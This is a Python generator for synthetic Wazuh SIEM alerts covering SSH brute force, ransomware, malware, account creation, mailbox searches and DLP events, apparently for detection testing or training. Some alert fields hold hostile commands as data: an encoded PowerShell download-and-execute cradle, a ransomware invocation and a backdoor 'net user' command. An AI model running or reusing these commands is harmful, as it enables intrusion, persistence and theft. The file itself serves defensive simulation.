import random
from datetime import datetime, timedelta
from .base_generator import BaseGenerator


class WazuhGenerator(BaseGenerator):
    """Generator for Wazuh EDR/SIEM alerts."""

    def __init__(self, config: dict = None, asset_gen=None):
        super().__init__(config)
        self.asset_gen = asset_gen
        self.rules = []
        self.agents = []
        self._load_rules()

    def _load_rules(self):
        """Load Wazuh rules from dictionary."""
        rules = self.get_dict("rules", [])
        self.rules = rules
        hostnames = self.get_dict("hostnames", ["srv-test-01"])
        self.agents = [
            {"id": f"{i+1:03d}", "name": hostnames[i % len(hostnames)], "ip": f"192.168.10.{10+i}"}
            for i in range(50)
        ]

    def generate_alert(self, timestamp: str = None, event_type: str = None) -> dict:
        """Generate a single Wazuh alert."""
        if timestamp is None:
            timestamp = self.random_timestamp()
        
        if event_type == "ssh_brute_force":
            return self._generate_ssh_brute_force(timestamp)
        elif event_type == "ssh_login_success":
            return self._generate_ssh_login(timestamp, success=True)
        elif event_type == "ssh_login_failed":
            return self._generate_ssh_login(timestamp, success=False)
        elif event_type == "powershell_encoded":
            return self._generate_powershell_encoded(timestamp)
        elif event_type == "file_encryption":
            return self._generate_file_encryption(timestamp)
        elif event_type == "malware_detection":
            return self._generate_malware_detection(timestamp)
        elif event_type == "privilege_escalation":
            return self._generate_privilege_escalation(timestamp)
        elif event_type == "user_created":
            return self._generate_user_created(timestamp)
        elif event_type == "usb_connected":
            return self._generate_usb_connected(timestamp)
        elif event_type == "email_scan":
            return self._generate_email_scan(timestamp)
        elif event_type == "dlp_high_volume":
            return self._generate_dlp_alert(timestamp)
        elif event_type == "mass_printing":
            return self._generate_mass_printing(timestamp)
        
        return self._generate_random_alert(timestamp)

    def _generate_ssh_brute_force(self, timestamp: str) -> dict:
        """Generate SSH brute force attempt alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "5715",
                "level": 10,
                "description": "sshd: brute force trying to get access to the system",
                "groups": ["authentication", "attack_attempt"],
                "mitre": ["T1110"]
            },
            "decoder": {"name": "sshd"},
            "data": {
                "srcip": self.random_external_ip(),
                "dstip": agent["ip"],
                "user": random.choice(["root", "admin", "oracle", "guest"]),
                "command": None
            },
            "location": "/var/log/auth.log",
            "full_log": f"Jan 15 14:32:17 {agent['name']} sshd[1234]: Failed password for {random.choice(['root', 'admin'])} from {self.random_external_ip()} port {random.randint(40000, 60000)} ssh2"
        }

    def _generate_ssh_login(self, timestamp: str, success: bool = True) -> dict:
        """Generate SSH login alert."""
        agent = random.choice(self.agents)
        user = random.choice(["admin", "root", "oracle", "webadmin"])
        
        if success:
            return {
                "timestamp": timestamp,
                "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
                "rule": {
                    "id": "5720",
                    "level": 12,
                    "description": "sshd: external user login success",
                    "groups": ["authentication", "attack_success"],
                    "mitre": ["T1078"]
                },
                "decoder": {"name": "sshd"},
                "data": {
                    "srcip": self.random_external_ip(),
                    "dstip": agent["ip"],
                    "user": user,
                    "command": None
                },
                "location": "/var/log/auth.log",
                "full_log": f"Jan 15 14:42:17 {agent['name']} sshd[5678]: Accepted password for {user} from {self.random_external_ip()} port {random.randint(40000, 60000)} ssh2"
            }
        else:
            return {
                "timestamp": timestamp,
                "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
                "rule": {
                    "id": "5710",
                    "level": 3,
                    "description": "sshd: authentication failed",
                    "groups": ["authentication", "sshd"],
                    "mitre": ["T1110"]
                },
                "decoder": {"name": "sshd"},
                "data": {
                    "srcip": self.random_external_ip(),
                    "dstip": agent["ip"],
                    "user": user,
                    "command": None
                },
                "location": "/var/log/auth.log",
                "full_log": f"Jan 15 14:32:17 {agent['name']} sshd[1234]: Failed password for {user} from {self.random_external_ip()} port {random.randint(40000, 60000)} ssh2"
            }

    def _generate_powershell_encoded(self, timestamp: str) -> dict:
        """Generate PowerShell encoded command alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100003",
                "level": 12,
                "description": "PowerShell encoded command execution",
                "groups": ["powershell", "execution"],
                "mitre": ["T1059.001"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": self.random_external_ip(),
                "user": random.choice(["SYSTEM", "admin", "svc_backup"]),
                "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
            },
            "location": "Application",
            "full_log": f"PowerShell encoded command executed on {agent['name']}"
        }

    def _generate_file_encryption(self, timestamp: str) -> dict:
        """Generate file encryption (ransomware) alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100050",
                "level": 15,
                "description": "Ransomware pattern detected",
                "groups": ["malware", "ransomware"],
                "mitre": ["T1486"]
            },
            "decoder": {"name": "syslog"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": "SYSTEM",
                "command": f"lockbit.exe -lock C:\\Users\\*"
            },
            "location": "/var/log/syslog",
            "full_log": f"Ransomware encryption pattern detected on {agent['name']}: {random.randint(100, 500)} files encrypted"
        }

    def _generate_malware_detection(self, timestamp: str) -> dict:
        """Generate malware detection alert."""
        agent = random.choice(self.agents)
        malware = random.choice(["LockBit", "Emotet", "TrickBot", "CobaltStrike"])
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100010",
                "level": 15,
                "description": f"Malware detected: {malware}",
                "groups": ["malware", "trojan"],
                "mitre": ["T1566"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": self.random_external_ip(),
                "user": random.choice(["admin", "SYSTEM"]),
                "command": f"C:\\Temp\\{malware.lower()}.exe"
            },
            "location": "Application",
            "full_log": f"Malware {malware} detected on {agent['name']}"
        }

    def _generate_privilege_escalation(self, timestamp: str) -> dict:
        """Generate privilege escalation alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100201",
                "level": 12,
                "description": "User added to Domain Admins group",
                "groups": ["account", "privilege_escalation"],
                "mitre": ["T1069.002"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": "svc_backup",
                "command": None
            },
            "location": "Security",
            "full_log": f"User svc_backup added to Domain Admins group on {agent['name']}"
        }

    def _generate_user_created(self, timestamp: str) -> dict:
        """Generate user creation alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100200",
                "level": 8,
                "description": "User added to domain group",
                "groups": ["account", "group_modification"],
                "mitre": ["T1069"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": random.choice(["admin", "administrator"]),
                "command": "net user svc_backup P@ssw0rd123 /add"
            },
            "location": "Security",
            "full_log": f"New user svc_backup created on {agent['name']}"
        }

    def _generate_usb_connected(self, timestamp: str) -> dict:
        """Generate USB device connected alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100100",
                "level": 7,
                "description": "USB device connected",
                "groups": ["hardware", "removable_device"],
                "mitre": ["T1200"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": random.choice(["admin", "john.doe"]),
                "command": None
            },
            "location": "System",
            "full_log": f"USB device Kingston 64GB connected on {agent['name']}"
        }

    def _generate_email_scan(self, timestamp: str) -> dict:
        """Generate email scanning alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100040",
                "level": 10,
                "description": "Suspicious PowerShell email scan",
                "groups": ["collection", "email"],
                "mitre": ["T1114"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": random.choice(["admin", "svc_backup"]),
                "command": "Get-Mailbox | Search-Mailbox -SearchQuery 'subject:*' -LogLevel Suppress"
            },
            "location": "Application",
            "full_log": f"PowerShell script scanning emails on {agent['name']}"
        }

    def _generate_dlp_alert(self, timestamp: str) -> dict:
        """Generate DLP high volume alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100060",
                "level": 8,
                "description": "High volume data download",
                "groups": ["dlp", "exfiltration"],
                "mitre": ["T1041"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": random.choice(["john.doe", "admin"]),
                "command": None
            },
            "location": "Application",
            "full_log": f"User {random.choice(['john.doe', 'admin'])} downloaded {random.randint(50, 200)} files on {agent['name']}"
        }

    def _generate_mass_printing(self, timestamp: str) -> dict:
        """Generate mass printing alert."""
        agent = random.choice(self.agents)
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": "100070",
                "level": 6,
                "description": "Mass printing detected",
                "groups": ["dlp", "print"],
                "mitre": ["T1123"]
            },
            "decoder": {"name": "windows_eventchannel"},
            "data": {
                "srcip": agent["ip"],
                "dstip": None,
                "user": random.choice(["john.doe", "admin"]),
                "command": None
            },
            "location": "Application",
            "full_log": f"User printed {random.randint(100, 300)} pages on {agent['name']}"
        }

    def _generate_random_alert(self, timestamp: str) -> dict:
        """Generate random alert."""
        if not self.rules:
            return self._generate_ssh_brute_force(timestamp)
        
        rule = random.choice(self.rules)
        agent = random.choice(self.agents)
        
        return {
            "timestamp": timestamp,
            "agent": {"id": agent["id"], "name": agent["name"], "ip": agent["ip"]},
            "rule": {
                "id": rule["id"],
                "level": rule["level"],
                "description": rule["description"],
                "groups": rule["groups"],
                "mitre": rule["mitre"]
            },
            "decoder": {"name": random.choice(["sshd", "windows_eventchannel", "syslog"])},
            "data": {
                "srcip": self.random_ip(),
                "dstip": agent["ip"],
                "user": random.choice(["admin", "SYSTEM", "john.doe"]),
                "command": None
            },
            "location": random.choice(["/var/log/auth.log", "Application", "Security"]),
            "full_log": f"Alert triggered on {agent['name']}: {rule['description']}"
        }

    def generate_alerts(self, count: int = 100, start: datetime = None, end: datetime = None) -> list:
        """Generate multiple Wazuh alerts."""
        if start is None:
            start = datetime.utcnow() - timedelta(days=1)
        if end is None:
            end = datetime.utcnow()
        
        alerts = []
        for _ in range(count):
            timestamp = self.random_timestamp(start, end)
            alerts.append(self._generate_random_alert(timestamp))
        
        return alerts

    def generate_alerts_for_scenario(self, events: list, base_time: datetime) -> list:
        """Generate alerts for a specific scenario timeline."""
        alerts = []
        
        for event in events:
            if event["source"] != "wazuh":
                continue
            
            offset = timedelta(minutes=event.get("offset_minutes", 0))
            timestamp = (base_time + offset).strftime("%Y-%m-%dT%H:%M:%SZ")
            
            alert = self.generate_alert(timestamp=timestamp, event_type=event["event"])
            alerts.append(alert)
        
        return alerts
